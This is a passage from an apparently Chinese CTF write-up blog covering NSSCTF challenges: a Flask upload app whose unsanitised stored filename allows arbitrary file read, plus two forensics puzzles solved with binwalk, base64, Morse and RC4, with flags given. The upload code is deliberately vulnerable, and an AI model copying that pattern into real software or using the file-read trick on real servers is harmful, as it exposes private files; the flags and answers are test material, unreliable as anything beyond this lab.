class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, g, send_from_directory<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br><br>SCHEMA = <span class="hljs-string">&quot;&quot;&quot;CREATE TABLE files (</span><br><span class="hljs-string">id text primary key,</span><br><span class="hljs-string">path text</span><br><span class="hljs-string">);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    g_db = <span class="hljs-built_in">getattr</span>(g, <span class="hljs-string">&#x27;_database&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> g_db <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        g_db = g._database = sqlite3.connect(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    <span class="hljs-keyword">return</span> g_db<br><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>():<br>    os.remove(<span class="hljs-string">&quot;database.db&quot;</span>)<br>    cur = db().cursor()<br>    cur.executescript(SCHEMA)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">    Select image to upload:</span><br><span class="hljs-string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;!-- /source --&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;&quot;&quot;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(directory=<span class="hljs-string">&quot;/var/www/html/&quot;</span>, path=<span class="hljs-string">&quot;www.zip&quot;</span>, as_attachment=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> file.filename:<span class="hljs-comment">#文件名不能有点，也就是不能有后缀</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad filename!&quot;</span>, <span class="hljs-number">403</span><br>    conn = db()<br>    cur = conn.cursor()<br>    uid = uuid.uuid4().<span class="hljs-built_in">hex</span>  <span class="hljs-comment">#生成一个UID号</span><br>    <span class="hljs-keyword">try</span>:<span class="hljs-comment">#将uid号和文件名放入数据库</span><br>        cur.execute(<span class="hljs-string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))<br>    <span class="hljs-keyword">except</span> sqlite3.IntegrityError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Duplicate file&quot;</span><br>    conn.commit()<br><br>    file.save(<span class="hljs-string">&#x27;uploads/&#x27;</span> + file.filename)    <span class="hljs-comment">#文件保存路径</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/file/&#x27;</span> + uid)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    conn = db()<br>    cur = conn.cursor()<br>    cur.execute(<span class="hljs-string">&quot;select path from files where id=?&quot;</span>, (<span class="hljs-built_in">id</span>,))<br><span class="hljs-comment">#通过uid号对应的文件名来作为路径访问</span><br>    res = cur.fetchone()  <span class="hljs-comment">#放回文件路径</span><br>    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File not found&quot;</span>, <span class="hljs-number">404</span>    <br><br>    <span class="hljs-comment"># print(res[0])</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&quot;uploads/&quot;</span>, res[<span class="hljs-number">0</span>]), <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<span class="hljs-comment">#读取文件</span><br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>审计一下</p><p>上传的文件文件没有后缀，必定不会解析，看到后面也发现是利用文件名来实现文件读取</p><p>整体逻辑：上传一个文件，获取一个文件的UID号，将UID号和作为字段名，文件名作为字段值存储到数据库中，文件保存路径为<code>'uploads/' + file.filename</code>,通过UID号访问获得文件名，从而访问<code>'uploads/' + file.filename</code>.</p><p>所以这里的文件名可以使用系统中已有的文件路径，从而导致文件读取</p><img src="/2023/01/04/NSSCTFwp/7.png" class=""><p>直接访问/file/uid就可以得到flag<code>NSSCTF&#123;b56d535f-18b5-4446-9014-e33ad2496b8e&#125;</code></p><h3 id="swpu-2019神奇的二维码"><a class="markdownIt-Anchor" href="#swpu-2019神奇的二维码"></a> [SWPU 2019]神奇的二维码</h3><p>附件是一张二维码</p><img src="/2023/01/04/NSSCTFwp/MISC-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81-BitcoinPay.png" class=""><p>扫描后swpuctf{flag_is_not_here}是假的flag</p><p>放到虚拟机binwalk一下</p><img src="/2023/01/04/NSSCTFwp/binwalk.png" class=""><p>发现有很多压缩包</p><p><code>binwalk -e MISC-神奇的二维码-BitcoinPay.png</code>分解出来</p><p>里面有一个flag.doc是一堆base64编码</p><p>通过20次base64解码</p><p>得到<code>comEON_YOuAreSOSoS0great</code>,这是打开18394.rar里面音频的密码</p><p>音频打开后是一段莫斯密码</p><p>用Au打开，手动解码</p><img src="/2023/01/04/NSSCTFwp/morse.png" class=""><p>长的为<code>-</code>，短的为<code>.</code>，空的用<code>/</code>分隔</p><p>得到<code>--/---/.-./..././../.../...-/./.-./-.--/...-/./.-./-.--/./.-/.../-.--/</code></p><p>在线解码得到<code>MORSEISVERYVERYEASY</code>,用Python<code>&quot;MORSEISVERYVERYEASY&quot;.lower()</code>转小写</p><p><code>NSSCTF&#123;morseisveryveryeasy&#125;</code></p><h3 id="swpu-2020套娃"><a class="markdownIt-Anchor" href="#swpu-2020套娃"></a> [SWPU 2020]套娃</h3><p>附件下下来，得到打不开的swpu.xlsx和RC4data.txt</p><p>Office文件的本质都是一个zip压缩包</p><p>改后缀为zip,打开swpu.zip</p><p>又得到两个.xlsx文件：RC4key.xlsx,esayrc4.xlsx</p><p>都改为zip，发现只有RC4key.zip可以打开，esayrc4.zip打不开</p><p>RC4key.zip打开为一个加密的RC4key.txt</p><p>将esayrc4.xlsx放到WinHex里面在最下面发现密码<code>password:6e4c834d77cba03af41e1562a5bce84e</code>,</p><p>解压RC4key.zip得到<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>,</p><p>结合RC4data.txt 在线RC4解密得到ef1a73d40977a49b99b871980f355757</p><p><code>NSSCTF&#123;ef1a73d40977a49b99b871980f355757&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
